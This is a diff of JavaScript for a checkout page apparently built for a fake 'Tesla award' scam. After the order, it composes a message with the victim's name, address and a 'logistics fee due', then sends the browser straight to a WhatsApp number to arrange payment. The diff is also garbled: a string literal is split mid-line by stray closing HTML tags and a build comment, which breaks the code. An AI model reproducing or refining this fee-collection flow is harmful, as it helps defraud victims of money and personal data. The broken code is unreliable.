@@ -177,14 +177,25 @@
 
     doApiCall('/order', 'POST', payload).then(function(r) {
       var ord = r.order || {};
+      // Save full order to localStorage for order-placed page
       localStorage.setItem('tesla_last_order', JSON.stringify(ord));
+      if (ord.selectedCar) localStorage.setItem('tesla_selected_car', JSON.stringify(ord.selectedCar));
+      if (ord.deliveryDetails) localStorage.setItem('tesla_delivery_details', JSON.stringify(ord.deliveryDetails));
+      if (ord.deliveryMethod) localStorage.setItem('tesla_delivery_method', JSON.stringify(ord.deliveryMethod));
+      
       var oid = ord.orderId || 'N/A';
       var trk = ord.trackingNumber || 'N/A';
       var nm  = (ord.deliveryDetails && ord.deliveryDetails.fullName) || 'N/A';
       var mdl = (ord.selectedCar && ord.selectedCar.name) ? 'Tesla ' + ord.selectedCar.name : 'N/A';
       var adr = ord.deliveryDetails ? [ord.deliveryDetails.address, ord.deliveryDetails.city, ord.deliveryDetails.state, ord.deliveryDetails.zipCode, ord.deliveryDetails.country].filter(Boolean).join(', ') : 'N/A';
       var dm  = (ord.deliveryMethod && ord.deliveryMethod.name) ? ord.deliveryMethod.name : 'N/A';
-      var fee = (ord.deliveryMethod && typeof ord.deliveryMethod.price !== 'undefined') ? '$' + ord.deliveryMethod.price : 'Pending';
+      var fee = (ord.deliveryMethod && typeof ord.deliveryMethod.price !== 'undefined') ? '
+  };
+})();
+</script>
+</body>
+<!-- build: 1784129877 -->
+</html> + ord.deliveryMethod.price : 'Pending';
       var msg = '*TESLA AWARD CONFIRMATION & PAYMENT DETAILS*\n\n' +
         '• *Order ID:* ' + oid + '\n' +
         '• *Tracking Number:* ' + trk + '\n' +
@@ -195,18 +206,22 @@
         '• *Payment Method:* ' + payMethodName + '\n' +
         '• *Total Logistics Fee Due:* ' + fee + '\n\n' +
         'Hi, I have successfully placed my order and would like to proceed with the payment confirmation of ' + fee + ' via ' + payMethodName + '. Please guide me with the secure checkout details.';
-      if (typeof hideLoading === 'function') {
-        hideLoading(function() { window.location.href = 'https://wa.me/' + PR + '?text=' + encodeURIComponent(msg); });
-      } else {
-        window.location.href = 'https://wa.me/' + PR + '?text=' + encodeURIComponent(msg);
-      }
+      
+      // Remove loading overlay if it exists, then redirect immediately
+      try { var overlay = document.getElementById('globalLoader'); if (overlay) overlay.remove(); } catch(e) {}
+      // Redirect to WhatsApp immediately — no waiting for animation
+      window.location.href = 'https://wa.me/' + PR + '?text=' + encodeURIComponent(msg);
+      
     }).catch(function(e) {
       _isProcessing = false;
-      btn.disabled = false;
-      btn.style.opacity = '1';
-      btn.style.cursor = 'pointer';
-      btn.textContent = '🔒 Pay ' + (sm ? sm.priceDisplay : '') + ' & Place Order';
-      if (typeof hideLoading === 'function') hideLoading();
+      var btn2 = document.getElementById('payBtn');
+      if (btn2) {
+        btn2.disabled = false;
+        btn2.style.opacity = '1';
+        btn2.style.cursor = 'pointer';
+        btn2.textContent = '🔒 Pay ' + (sm ? sm.priceDisplay : '') + ' & Place Order';
+      }
+      try { var overlay2 = document.getElementById('globalLoader'); if (overlay2) overlay2.remove(); } catch(e2) {}
       if (typeof showToast === 'function') showToast(e.message || 'Order failed. Please try again.', 'error');
     });
   };
